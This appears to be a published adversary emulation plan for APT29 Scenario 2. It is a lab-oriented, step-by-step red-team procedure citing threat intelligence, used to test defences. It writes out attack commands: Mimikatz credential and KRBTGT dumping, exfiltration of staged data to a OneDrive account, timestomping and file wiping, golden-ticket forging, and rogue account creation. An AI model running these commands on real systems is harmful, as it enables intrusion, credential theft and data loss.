# Preface

APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each. Within each scenario, operations have been broken into specific objectives, which are presented linearly as each enables subsequent objectives. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources.  The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives.

---

# Scenario 2 Overview

* Emulation of APT29 usage of tools such as PowerDuke, POSHSPY, CloudDuke, as well as more recent (2016+) TTPs
* Scenario begins with a target spearphishing leading into a low and slow, methodical approach to owning the initial target and eventually the entire domain
* Includes establishing persistence, credential gathering, local and remote enumeration, and data exfil
* Modular components (ex: PowerShell scripts) may be executed atomically

## Contents

* [Step 11 - Initial Breach](#step-11---initial-breach)
* [Step 12 - Fortify Access](#step-12---fortify-access)
* [Step 13 - Local Enumeration](#step-13---local-enumeration)
* [Step 14 - Elevation](#step-14---elevation)
* [Step 15 - Establish Persistence](#step-15---establish-persistence)
* [Step 16 - Lateral Movement](#step-16---lateral-movement)
* [Step 17 - Collection](#step-17---collection)
* [Step 18 - Exfiltration](#step-18---exfiltration)
* [Step 19 - Clean Up](#step-19---clean-up)
* [Step 20 - Leverage Persistence](#step-20---leverage-persistence)
* [Acknowledgements](#acknowledgements)
* [Additional Plan Resources](#additional-plan-resources)

## Pre-requisites

Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the [Scenario 2 Infrastructure](/apt29/Emulation_Plan/Scenario_2/Infrastructure.md) documentation.

---

## Step 11 - Initial Breach

The scenario begins with initial breach, where a legitimate user clicks ([T1204](https://attack.mitre.org/versions/v6/techniques/T1204/) / [T1204.002](https://attack.mitre.org/techniques/T1204/002/)) a link file payload, which executes an alternate data stream (ADS) hidden on another dummy file ([T1096](https://attack.mitre.org/versions/v6/techniques/T1096/) / [T1564.004](https://attack.mitre.org/techniques/T1564/004/)) delivered as part of the spearphishing campaign. The ADS performs a series of enumeration commands to ensure it is not executing in a virtualized analysis environment ([T1497](https://attack.mitre.org/versions/v6/techniques/T1497/) / [T1497.001](https://attack.mitre.org/techniques/T1497/001), [T1082](https://attack.mitre.org/techniques/T1082/), [T1120](https://attack.mitre.org/techniques/T1120/), [T1033](https://attack.mitre.org/techniques/T1033/), [T1016](https://attack.mitre.org/techniques/T1016/), [T1057](https://attack.mitre.org/techniques/T1057/), [T1083](https://attack.mitre.org/techniques/T1083/)) before establishing persistence via a Windows Registry Run key entry ([T1060](https://attack.mitre.org/versions/v6/techniques/T1060/) / [T1547.001](https://attack.mitre.org/techniques/T1547/001/)) pointing to an embedded DLL payload that was decoded and dropped to disk ([T1140](https://attack.mitre.org/techniques/T1140/)). The ADS then executes a PowerShell stager ([T1086](https://attack.mitre.org/versions/v6/techniques/T1086/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/)) which creates a C2 connection over port 443 ([T1043](https://attack.mitre.org/versions/v6/techniques/T1043/)) using the HTTPS protocol ([T1032](https://attack.mitre.org/versions/v6/techniques/T1032/) / [T1573.002](https://attack.mitre.org/techniques/T1573/002/) , [T1071](https://attack.mitre.org/versions/v6/techniques/T1071/) / [T1071.001](https://attack.mitre.org/techniques/T1071/001/)).

### Procedures

#### 11.A - User Execution: Malicious File ([T1204](https://attack.mitre.org/versions/v6/techniques/T1204/) / [T1204.002](https://attack.mitre.org/techniques/T1204/002/))

1. As non-domain admin user, execute `37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk` (double click), output will display in terminal
2. You will now receive a new, low integrity callback

### Cited Intelligence

* Open Invitation Contributor: Microsoft

* APT29 has used several persistence mechanisms, including, Registry run keys. <sup> [5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016), [11](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/) </sup>

* APT29 phishing campaigns have contained weaponized Windows shortcut files that executed an obfuscated PowerShell command from within the file and dropped a DLL to the victim’s system. <sup> [8](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html), [11](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/), [16](https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/) </sup>

* PowerDuke has performed anti-VM checks designed to avoid executing in virtualized environments. PowerDuke payloads have also contained a component hidden in an ADS and connected to C2 over port 443. <sup> [11](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/) </sup>

Note: The anti-analysis commands and logic were derived from a VirusTotal submission. <sup> [9](https://www.virustotal.com/gui/file/2f39dee2ee608e39917cc022d9aae399959e967a2dd70d83b81785a98bd9ed36) </sup>

---

## Step 12 - Fortify Access

The attacker modifies the time attributes of the DLL payload ([T1099](https://attack.mitre.org/versions/v6/techniques/T1099/) / [T1070.006](https://attack.mitre.org/techniques/T1070/006/)) used in the previously established persistence mechanism to match that of a random file found in the victim’s System32 directory ([T1083](https://attack.mitre.org/techniques/T1083/)). The attacker then enumerates registered AV products ([T1063](https://attack.mitre.org/versions/v6/techniques/T1063/) / [T1518.001](https://attack.mitre.org/techniques/T1518/001/)) and software installed by the user documented in the Windows Registry ([T1012](https://attack.mitre.org/techniques/T1012/)).

### Procedures

#### 12.A - Indicator Removal on Host: Timestomp ([T1099](https://attack.mitre.org/versions/v6/techniques/T1099/) / [T1070.006](https://attack.mitre.org/techniques/T1070/006/))

1. Load `timestomp.ps1`
2. Execute `timestomp C:\Users\oscar\AppData\Roaming\Microsoft\kxwn.lock`

#### 12.B - Software Discovery: Security Software Discovery ([T1063](https://attack.mitre.org/versions/v6/techniques/T1063/) / [T1518.001](https://attack.mitre.org/techniques/T1518/001/))

1. Load `stepTwelve.ps1`
2. Execute `detectav`

#### 12.C - Software Discovery ([T1518](https://attack.mitre.org/versions/v6/techniques/T1518/) / [T1518.001](https://attack.mitre.org/techniques/T1518/001/))

1. Execute `software`

### Cited Intelligence

* Open Invitation Contributors: Kaspersky, SentinelOne

* POSHSPY can modify standard information timestamps of downloaded executables to match a randomly selected file from the System32 directory. PowerDuke also has had undescribed commands named "detectav” and "software."<sup>[10](https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html)</sup>

---

## Step 13 - Local Enumeration

The attacker performs local enumeration using various Windows API calls, specifically gathering the local computer name ([T1082](https://attack.mitre.org/techniques/T1082/)), domain name ([T1016](https://attack.mitre.org/techniques/T1016/)), current user context ([T1033](https://attack.mitre.org/techniques/T1033/)), and running processes ([T1057](https://attack.mitre.org/techniques/T1057/)).

### Procedures

#### 13.A - System Information Discovery ([T1082](https://attack.mitre.org/techniques/T1082/))

1. Load `stepThirteen.ps1`
2. Execute `comp`

#### 13.B - System Network Configuration Discovery ([T1016](https://attack.mitre.org/techniques/T1016/))

1. Execute `domain`

#### 13.C - System Owner/User Discovery ([T1033](https://attack.mitre.org/techniques/T1033/))

1. Execute `user`

#### 13.D - Process Discovery ([T1057](https://attack.mitre.org/techniques/T1057/))

1. Execute `pslist`

### Cited Intelligence

* PowerDuke can get the NetBIOS name, the computer’s domain name, user’s name, and process list via select Windows API calls.<sup>[11](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/)</sup>

---

## Step 14 - Elevation

The attacker elevates privileges via a user account control (UAC) bypass ([T1122](https://attack.mitre.org/versions/v6/techniques/T1122/) / [T1546.015](https://attack.mitre.org/techniques/T1546/015/), [T1088](https://attack.mitre.org/versions/v6/techniques/T1088/) / [T1548.002](https://attack.mitre.org/techniques/T1548/002/)). The attacker then uses the new elevated access to create and execute code within a custom WMI class ([T1047](https://attack.mitre.org/techniques/T1047/)) that downloads ([T1105](https://attack.mitre.org/techniques/T1105/)) and executes Mimikatz to dump plain-text credentials ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1003.001](https://attack.mitre.org/techniques/T1003/001/)), which are parsed, encoded, and stored in the WMI class ([T1027](https://attack.mitre.org/techniques/T1027/)). After tracking that the WMI execution has completed ([T1057](https://attack.mitre.org/techniques/T1057/)), the attacker reads the plaintext credentials stored within the WMI class ([T1140](https://attack.mitre.org/techniques/T1140/)).

### Procedures

#### 14.A - Abuse Elevation Control Mechanism: Bypass User Access Control ([T1088](https://attack.mitre.org/versions/v6/techniques/T1088/) / [T1548.002](https://attack.mitre.org/techniques/T1548/002/))

1. Load `stepFourteen_bypassUAC.ps1`
2. Execute `bypass`
3. You will now receive a new, high integrity callback

#### 14.B - OS Credential Dumping: LSASS Memory ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1003.001](https://attack.mitre.org/techniques/T1003/001/))

1. Go to  where m.exe is on C2 server in another terminal
2. Confirm `m.exe` is there and is a Windows PE (`$ file m`)
    * `m.exe` is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)
3. Host file on port 8080 (`$ sudo python -m SimpleHTTPServer 8080`)
4. Interact with new callback
5. Load `stepFourteen_credDump.ps1`
6. Execute `wmidump`
7. Kill the python server (CTRL-C) once you see a GET request on the python server (VM terminal)

### Cited Intelligence

* Open Invitation Contributors: Microsoft, SentinelOne

* APT29 has embedded and encoded PowerShell scripts in WMI class properties.<sup>[5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016),[10](https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html) </sup>

* APT29 has bypassed UAC to elevate privileges.<sup>[5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016) </sup>

* APT29 has used WMI to store and run Invoke-Mimikatz (ATT&CK S0002) on remote hosts.<sup>[7](https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html),[12](https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/) </sup>

* POSHSPY has used WMI to both store and persist PowerShell backdoor code. POSHSPY can also download and execute additional PowerShell code and Windows binaries.<sup> [7](https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html),[10](https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html),[12](https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/) </sup>

---

## Step 15 - Establish Persistence

The attacker establishes a secondary means of persistent access to the victim by creating a WMI event subscription ([T1084](https://attack.mitre.org/versions/v6/techniques/T1084/) / [T1546.003](https://attack.mitre.org/techniques/T1546/003/)) to execute a PowerShell payload whenever the current user ([T1033](https://attack.mitre.org/techniques/T1033/)) logs in.

### Procedures

#### 15.A - Event Triggered Execution: Windows Management Instrumentation Event Subscription ([T1084](https://attack.mitre.org/versions/v6/techniques/T1084/) / [T1546.003](https://attack.mitre.org/techniques/T1546/003/))

1. Load `stepFifteen_wmi.ps1`
2. Execute `wmi`

**Note:** Do not RDP into the initial access from this point forward, you will trigger callbacks intended for step 20

### Cited Intelligence

* Open Invitation Contributors: Microsoft, SentinelOne

* APT29 has used several persistence mechanisms, including WMI backdoors that execute PowerShell components.<sup> [5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016),[10](https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html) </sup>

---

## Step 16 - Lateral Movement

The attacker enumerates the environment’s domain controller ([T1018](https://attack.mitre.org/techniques/T1018/)) and the domain’s security identifier (SID) ([T1033](https://attack.mitre.org/techniques/T1033/)) via the Windows API ([T1106](https://attack.mitre.org/techniques/T1106/)). Next, the attacker uses the previously dumped credentials ([T1078](https://attack.mitre.org/versions/v6/techniques/T1078/) / [T1078.002](https://attack.mitre.org/techniques/T1078/002/)) to create a remote PowerShell session to the domain controller ([T1028](https://attack.mitre.org/versions/v6/techniques/T1028/) / [T1021.006](https://attack.mitre.org/techniques/T1021/006/)). Through this connection, the attacker copies the Mimikatz binary used in Step 14 to the domain controller ([T1105](https://attack.mitre.org/versions/v6/techniques/T1105/) / [T1570](https://attack.mitre.org/techniques/T1570/)) then dumps the hash of the KRBTGT account ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1003.001](https://attack.mitre.org/techniques/T1003/001)).

### Procedures

#### 16.A - Remote System Discovery ([T1018](https://attack.mitre.org/techniques/T1018/))

1. Interact with low integrity callback
2. Load `powerView.ps1` (available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
3. Execute `get-netdomaincontroller`

#### 16.B - System Owner/User Discovery ([T1033](https://attack.mitre.org/techniques/T1033/))

1. Load `stepSixteen_SID.ps1`
2. Execute `siduser`
3. Save the value for the domain SID (ex: `S-1-5-21-2219224806-3979921203-557828661-1110`) and delete the RID (ex: `-1110`) of the end (ex: `S-1-5-21-2219224806-3979921203-557828661`)

#### 16.C - Remote Services: Windows Remote Management ([T1028](https://attack.mitre.org/versions/v6/techniques/T1028/) / [T1021.006](https://attack.mitre.org/techniques/T1021/006/))

1. Interact with high integrity callback
2. Load `Invoke-WinRMSession.ps1` (available at https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps1)
3. Execute `invoke-winrmsession -Username "[insert domain admin username]" -Password "[insert domain admin password]" -IPAddress [insert domain controller IP]`
4. Output will tell you a session opened and give you the format for using it, ex:
    `Session opened, to run a command do the following:`
    `Invoke-Command -Session $[session_id] -scriptblock {Get-Process} | out-string`
5. Save the value for the session_id (ex: `$hzaqx`)

**Note:** If you get an error here, reboot domain controller, then re-run the 2 winrm setup commands before re-executing 16.C

#### 16.D - OS Credential Dumping ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1003.001](https://attack.mitre.org/techniques/T1003/001))

1. Execute `Copy-Item m.exe -Destination "C:\Windows\System32\" -ToSession $[session_id]`
    *  `m.exe` is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)
2. Execute `Invoke-Command -Session $[session_id] -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string`
3. Take note of value for the NTLM hash (ex: `NTLM : f4a688010d80770a55a22893dc6ac510`) near the top (Under RID and User after `* Primary`)
4. Execute `Get-PSSession | Remove-PSSession`

### Cited Intelligence

* Open Invitation Contributors: Microsoft, SentinelOne

* PowerDuke can get the current user’s SID via select Windows API calls.<sup> [11](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/) </sup>

---

## Step 17 - Collection

The attacker harvests emails stored in the local email client ([T1114](https://attack.mitre.org/versions/v6/techniques/T1114/) / [T1114.001](https://attack.mitre.org/techniques/T1114/001/)) before collecting ([T1005](https://attack.mitre.org/techniques/T1005/)) and staging ([T1074](https://attack.mitre.org/versions/v6/techniques/T1074/) / [T1074.001](https://attack.mitre.org/techniques/T1074/001/)) a file of interest. The staged file is compressed ([T1002](https://attack.mitre.org/versions/v6/techniques/T1002/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001)) as well as prepended with the magic bytes of the GIF file type ([T1027](https://attack.mitre.org/techniques/T1027/)).

### Procedures

#### 17.A - Email Collection: Local Email Collection ([T1114](https://attack.mitre.org/versions/v6/techniques/T1114/) / [T1114.001](https://attack.mitre.org/techniques/T1114/001/))

1. Interact with low integrity callback
2. Load `stepSeventeen_email.ps1`
3. Execute `psemail`

#### 17.B - Data from Local System ([T1005](https://attack.mitre.org/techniques/T1005/))

1.  Interact with high integrity callback
2.  Execute `New-Item -Path "C:\Windows\Temp\" -Name "WindowsParentalControlMigration" -ItemType "directory"`
3.  Execute `Copy-Item "C:\Users\oscar\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration"`

#### 17.C - Obfuscated Files or Information ([T1027](https://attack.mitre.org/techniques/T1027/))

1.  Load `stepSeventeen_zip.ps1`
2.  Execute `zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration`

### Cited Intelligence

* Open Invitation Contributors: Kaspersky, Microsoft

* APT29 has used the legit Microsoft DLL and PowerShell to interact with Exchange Web Services (EWS) for email theft.<sup> [7](https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html) </sup>

* POSHSPY can appended a file signature header to all encrypted data prior to upload or download.<sup> [10](https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html) </sup>

---

## Step 18 - Exfiltration

The attacker maps a local drive to an online web service account ([T1102](https://attack.mitre.org/techniques/T1102/)) then exfiltrates the previous staged data to this repository ([T1048](https://attack.mitre.org/versions/v6/techniques/T1048/) / [T1567.002](https://attack.mitre.org/techniques/T567/002/)).

### Procedures

#### 18.A - Exfiltration Over Alternative Protocol ([T1048](https://attack.mitre.org/versions/v6/techniques/T1048/) / [T1567.002](https://attack.mitre.org/techniques/T567/002/))

1. Get CID for OneDrive account (https://www.laptopmag.com/articles/map-onedrive-network-drive)
2. Execute `net use y: https://d.docs.live.net/[CID] /user:[OneDrive account]@outlook.com "[OneDrive password]"`
3. Execute `Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "Y:\WindowsParentalControlMigration.tmp"`
4. Login to https://onedrive.live.com/?id=root&cid=[CID] to see exfil (`WindowsParentalControlMigration.tmp`)

### Cited Intelligence

* Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne

* CloudDuke can use a Microsoft OneDrive to exchange stolen data with its operators.<sup> [1](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf),[5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016) </sup>

---

## Step 19 - Clean Up

The attacker deletes various files ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/)) associated with that access by reflectively loading and executing the Sdelete binary ([T1055](https://attack.mitre.org/versions/v6/techniques/T1055/) / [T1055.002](https://attack.mitre.org/techniques/T1055/002/)) within powershell.exe.

### Procedures

#### 19.A - Indicator Removal on Host: File Deletion ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/))

1. Load `wipe.ps1`
2. Execute `wipe "C:\Windows\System32\m.exe"`

**Note:** There's a known bug here with ETW (Invoke-ReflectivePEInjection patches a function on the fly that ETW invokes) so callback may die and hang.

#### 19.B - Indicator Removal on Host: File Deletion ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/))

1. Execute `wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp"`

#### 19.C - Indicator Removal on Host: File Deletion ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/))

1. Execute `wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"`

### Cited Intelligence

* Open Invitation Contributors: Microsoft, SentinelOne

* APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete ([S0195](https://attack.mitre.org/software/S0195/)).<sup> [5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016) </sup>

* PowerDuke can write random data across then delete a file.<sup> [11](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/) </sup>

## Step 20 - Leverage Persistence

The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the DLL payload ([T1085](https://attack.mitre.org/versions/v6/techniques/T1085/) / [T1218.011](https://attack.mitre.org/techniques/T1218/011/)), referenced by the Windows Registry Run key, and the WMI event subscription ([T1084](https://attack.mitre.org/versions/v6/techniques/T1084/) / [T1546.003](https://attack.mitre.org/techniques/T1546/003/)), which executes a new PowerShell stager ([T1086](https://attack.mitre.org/versions/v6/techniques/T1086/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/)). The attacker uses the renewed access to generate a Kerberos Golden Ticket ([T1097](https://attack.mitre.org/versions/v6/techniques/T1097/) / [T1558.001](https://attack.mitre.org/techniques/T1558/001/), [T1558.003](https://attack.mitre.org/techniques/T1558/003/)), using materials from the earlier breach, which is used to establish a remote PowerShell session to a new victim ([T1028](https://attack.mitre.org/versions/v6/techniques/T1021/) / [T1021.006](https://attack.mitre.org/techniques/T1021/006/)). Through this connection, the attacker creates a new account within the domain ([T1136](https://attack.mitre.org/versions/v6/techniques/T1136/) / [T1136.001](https://attack.mitre.org/techniques/T1136/001/)).

### Procedures

#### 20.A - Persistence Execution ([T1085](https://attack.mitre.org/versions/v6/techniques/T1085/) / [T1218.011](https://attack.mitre.org/techniques/T1218/011/), [T1084](https://attack.mitre.org/versions/v6/techniques/T1084/) / [T1546.003](https://attack.mitre.org/techniques/T1546/003/))

1. Execute `restart-computer -force`
2. Existing 2 callbacks should die
3. RDP and login to initial victim once it reboots
4. Persistence mechanisms should fire on login (1 for DLL, 1 or more for WMI event subscription)

**Note:** You may need to repeat login process a few times (close and reopen RDP session) for WMI execute to fire

#### 20.B - Use Alternate Authentication Material: Pass the Ticket ([T1097](https://attack.mitre.org/versions/v6/techniques/T1097/) / [T1550.001](https://attack.mitre.org/techniques/T1550/001/), [T1550.003](https://attack.mitre.org/techniques/T1550/003/))

1. Interact with the SYSTEM PS callback (from WMI)
2. Execute `klist purge`
3. Load `Invoke-Mimikatz.ps1` (available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
4. Execute `invoke-mimikatz -command '"kerberos::golden /domain:dmevals.local /sid:[SID] /rc4:[NTLM HASH] /user:mscott /ptt"'` using the SID and NTLM values from earlier
5. Execute `klist` and confirm ticket is in cache
6. Execute `Enter-PSSession [hostname of second workstation in domain]`
7. Execute `Invoke-Command -ComputerName [hostname of second workstation in domain] -ScriptBlock {net user /add toby "pamBeesly<3"}`

### Cited Intelligence

* Open Invitation Contributors: Microsoft, SentinelOne

* APT29 have used Kerberos ticket attacks for lateral movement and has created accounts to log in.<sup> [5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016),[7](https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html) </sup>

---

## Acknowledgements

### Special thanks to the following public resources:

* Atomic Red Team (<https://github.com/redcanaryco/atomic-red-team>)
* Mimikatz (<https://github.com/gentilkiwi/mimikatz>)
* Pinvoke (<http://www.pinvoke.net>)
* PoshC2 (<https://github.com/nettitude/PoshC2>)
* POSHSPY (<https://github.com/matthewdunwoody/POSHSPY>)
* PowerSploit (<https://github.com/PowerShellMafia/PowerSploit>)
* PSReflect-Functions (<https://github.com/jaredcatkinson/PSReflect-Functions>)
* State of the Hack S2E01: #NoEasyBreach REVISITED (<https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html>)
* Use PowerShell to Interact with the Windows API (<https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1>)
* Yet another sdclt UAC bypass (<http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass>)

---

## Additional Plan Resources

- [Intelligence Summary](/apt29/Intelligence_Summary.md)
- [Operations Flow](/apt29/Operations_Flow.md)
- [Emulation Plan](/apt29/Emulation_Plan/README.md)
  - [Scenario 1 - Infrastructure](/apt29/Emulation_Plan/Scenario_1/Infrastructure.md)
  - [Scenario 1](/apt29/Emulation_Plan/Scenario_1/README.md)
  - [Scenario 2 - Infrastructure](/apt29/Emulation_Plan/Scenario_2/Infrastructure.md)
  - [Scenario 2](/apt29/Emulation_Plan/Scenario_2/README.md)
  - [YAML](/apt29/Emulation_Plan/yaml)
- [Archive](/apt29/Archive)
- [Issues](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues)
- [Change Log](/apt29/CHANGE_LOG.md)
